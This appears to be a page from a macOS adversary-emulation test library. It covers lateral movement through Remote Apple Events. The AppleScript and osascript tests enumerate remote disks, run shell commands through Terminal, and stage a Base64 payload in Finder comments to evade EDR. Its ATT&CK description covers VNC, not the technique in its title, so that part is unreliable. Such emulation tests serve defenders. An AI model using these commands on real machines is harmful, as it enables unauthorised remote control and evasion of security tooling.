@@ -1,0 +1,128 @@
+---
+title: T1021.005
+description: "Remote Services  Remote Apple Events"
+---
+
+## Description from ATT&CK
+
+Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)
+
+VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)
+
+Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)
+
+## Tests
+
+### Test #1 - Enumerate remote volumes via RAE
+
+Remotely query the Finder for a list of mounted volumes on a target machine using Remote Apple Events (RAE) via the eppc:// protocol. Actions performed via Apple Events bypass security telemetry focused on process execution trees, making RAE a discreet lateral movement vector.
+
+
+**Input Arguments:**
+
+| Argument | Type | Default Value |
+|----------|------|---------------|
+| target | str | `192.168.1.1` |
+```applescript tab="<Code /> Script"
+tell application "Finder" of machine "eppc://192.168.1.1"
+  get name of every disk
+end tell
+
+```
+```bash tab="<Terminal /> Execution"
+# Execute with default arguments
+osascript -e 'tell application "Finder" of machine "eppc://192.168.1.1"' -e 'get name of every disk' -e 'end tell'
+
+# Or save to file and execute
+osascript enumerate_remote_volumes_via_rae.scpt
+
+# With custom arguments
+osascript enumerate_remote_volumes_via_rae.scpt "192.168.1.1"
+```
+
+**Download Files**
+
+<DownloadButton filename="enumerate_remote_volumes_via_rae.scpt" type="scpt" label="Download .scpt" />
+<DownloadButton filename="enumerate_remote_volumes_via_rae.swift" type="swift" label="Download .swift" />
+<DownloadButton filename="enumerate_remote_volumes_via_rae" type="binary" label="Download Binary" />
+<DownloadButton filename="enumerate_remote_volumes_via_rae.app" type="app" label="Download Application Bundle" />
+
+---
+
+### Test #2 - Remote execution via Terminal proxy via RAE
+
+Use Terminal.app as a remote execution proxy via Remote Apple Events (RAE) to bypass the -10016 Handler Error that prevents System Events from executing shell commands remotely. Terminal.app accepts do script commands over the eppc:// protocol and is designed for shell interaction.
+
+
+**Input Arguments:**
+
+| Argument | Type | Default Value |
+|----------|------|---------------|
+| target | str | `192.168.1.1` |
+| command | str | `whoami` |
+```applescript tab="<Code /> Script"
+tell application "Terminal" of machine "eppc://192.168.1.1"
+  do script "whoami"
+end tell
+
+```
+```bash tab="<Terminal /> Execution"
+# Execute with default arguments
+osascript -e 'tell application "Terminal" of machine "eppc://192.168.1.1"' -e 'do script "whoami"' -e 'end tell'
+
+# Or save to file and execute
+osascript remote_execution_via_terminal_proxy_via_rae.scpt
+
+# With custom arguments
+osascript remote_execution_via_terminal_proxy_via_rae.scpt "192.168.1.1" "whoami"
+```
+
+**Download Files**
+
+<DownloadButton filename="remote_execution_via_terminal_proxy_via_rae.scpt" type="scpt" label="Download .scpt" />
+<DownloadButton filename="remote_execution_via_terminal_proxy_via_rae.swift" type="swift" label="Download .swift" />
+<DownloadButton filename="remote_execution_via_terminal_proxy_via_rae" type="binary" label="Download Binary" />
+<DownloadButton filename="remote_execution_via_terminal_proxy_via_rae.app" type="app" label="Download Application Bundle" />
+
+---
+
+### Test #3 - Remote Finder comment staging via RAE
+
+Stage a Base64-encoded payload in the Finder comment (kMDItemFinderComment) of a newly created file on a remote machine via Remote Apple Events (RAE). Because the payload resides in Spotlight metadata rather than the file's data fork, it evades file-based EDR scanning of the target's filesystem.
+
+
+**Input Arguments:**
+
+| Argument | Type | Default Value |
+|----------|------|---------------|
+| target | str | `192.168.1.1` |
+| filename | str | `stage.txt` |
+| encodedPayload | str | `ZWNobyBoZWxsbyB3b3JsZA==` |
+```applescript tab="<Code /> Script"
+tell application "Finder" of machine "eppc://192.168.1.1"
+  set comment of (make new file at desktop with properties {name:"stage.txt"}) to "ZWNobyBoZWxsbyB3b3JsZA=="
+end tell
+
+```
+```bash tab="<Terminal /> Execution"
+# Execute with default arguments
+osascript -e 'tell application "Finder" of machine "eppc://192.168.1.1"' -e 'set comment of (make new file at desktop with properties {name:"stage.txt"}) to "ZWNobyBoZWxsbyB3b3JsZA=="' -e 'end tell'
+
+# Or save to file and execute
+osascript remote_finder_comment_staging_via_rae.scpt
+
+# With custom arguments
+osascript remote_finder_comment_staging_via_rae.scpt "192.168.1.1" "stage.txt" "ZWNobyBoZWxsbyB3b3JsZA=="
+```
+
+**Download Files**
+
+<DownloadButton filename="remote_finder_comment_staging_via_rae.scpt" type="scpt" label="Download .scpt" />
+<DownloadButton filename="remote_finder_comment_staging_via_rae.swift" type="swift" label="Download .swift" />
+<DownloadButton filename="remote_finder_comment_staging_via_rae" type="binary" label="Download Binary" />
+<DownloadButton filename="remote_finder_comment_staging_via_rae.app" type="app" label="Download Application Bundle" />
+
+## References
+
+- [MITRE ATT&CK T1021.005](https://attack.mitre.org/techniques/T1021/005/)
+- [Apple Script Language Guide](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)
